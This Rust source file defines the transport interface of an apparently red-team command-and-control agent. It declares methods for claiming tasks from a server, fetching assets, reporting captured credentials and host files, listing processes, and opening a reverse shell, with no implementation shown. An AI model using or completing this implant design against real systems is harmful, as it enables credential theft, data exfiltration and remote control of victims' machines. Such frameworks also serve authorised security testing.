use anyhow::Result;
use pb::c2::{beacon, *};
use std::sync::mpsc::{Receiver, Sender};

#[trait_variant::make(Transport: Send)]
pub trait UnsafeTransport: Clone + Send {
    // Init will initialize a new instance of the transport with no active connections.
    #[allow(dead_code)]
    fn init() -> Self;

    // New will create a new instance of the transport using the provided URI and server public key.
    #[allow(dead_code)]
    fn new(uri: String, proxy_uri: Option<String>, server_pubkey: [u8; 32]) -> Result<Self>;

    ///
    /// Contact the server for new tasks to execute.
    #[allow(dead_code)]
    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse>;

    ///
    /// Fetch an asset from the server, returning one or more chunks of data.
    /// The maximum size of these chunks is determined by the server.
    /// The server should reply with two headers:
    ///   - "sha3-256-checksum": A SHA3-256 digest of the entire file contents.
    ///   - "file-size": The number of bytes contained by the file.
    ///
    /// If no associated file can be found, a NotFound status error is returned.
    #[allow(dead_code)]
    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        sender: Sender<FetchAssetResponse>,
    ) -> Result<()>;

    ///
    /// Report a credential to the server.
    #[allow(dead_code)]
    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse>;

    ///
    /// Report a file from the host to the server.
    /// Providing content of the file is optional. If content is provided:
    ///   - Hash will automatically be calculated and the provided hash will be ignored.
    ///   - Size will automatically be calculated and the provided size will be ignored.
    /// Content is provided as chunks, the size of which are up to the agent to define (based on memory constraints).
    /// Any existing files at the provided path for the host are replaced.
    #[allow(dead_code)]
    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse>;

    ///
    /// Report the active list of running processes. This list will replace any previously reported
    /// lists for the same host.
    #[allow(dead_code)]
    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse>;

    ///
    /// Report execution output for a task.
    #[allow(dead_code)]
    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse>;

    ///
    /// Open a shell via the transport.
    #[allow(dead_code)]
    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()>;

    #[allow(dead_code)]
    fn get_type(&mut self) -> beacon::Transport;
    /// Returns true if the transport is fully initialized and active
    #[allow(dead_code)]
    fn is_active(&self) -> bool;

    /// Returns the name of the transport protocol (e.g., "grpc", "http")
    #[allow(dead_code)]
    fn name(&self) -> &'static str;

    /// Returns a list of available transports that this instance can switch to or supports.
    #[allow(dead_code)]
    fn list_available(&self) -> Vec<String>;
}
